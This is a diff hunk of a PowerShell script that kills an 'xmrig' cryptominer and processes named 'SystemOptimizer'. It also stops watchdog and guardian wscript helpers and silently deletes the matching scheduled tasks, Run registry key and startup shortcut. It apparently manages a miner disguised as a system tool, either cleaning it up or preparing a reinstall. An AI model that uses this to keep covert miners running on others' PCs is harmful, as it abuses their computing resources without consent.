@@ -51,13 +51,13 @@ Get-Process -Name "SystemOptimizer","xmrig" -ErrorAction SilentlyContinue | Stop
 Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
     Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*SystemOptimizer*" } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-# Remove old broken scheduled tasks
-schtasks /Delete /TN "SystemOptimizer" /F 2>$null | Out-Null
-schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null | Out-Null
-schtasks /Delete /TN "SystemOptimizer-Guardian" /F 2>$null | Out-Null
-schtasks /Delete /TN "SystemOptimizer-Check" /F 2>$null | Out-Null
+# Remove old broken scheduled tasks (cmd /c to fully suppress errors on clean PCs)
+cmd /c "schtasks /Delete /TN `"SystemOptimizer`" /F >nul 2>&1"
+cmd /c "schtasks /Delete /TN `"SystemOptimizer-Logon`" /F >nul 2>&1"
+cmd /c "schtasks /Delete /TN `"SystemOptimizer-Guardian`" /F >nul 2>&1"
+cmd /c "schtasks /Delete /TN `"SystemOptimizer-Check`" /F >nul 2>&1"
 # Remove old registry key
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /f 2>$null | Out-Null
+cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v SystemOptimizer /f >nul 2>&1"
 # Remove old startup shortcut
 $startupPath = [Environment]::GetFolderPath("Startup")
 Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
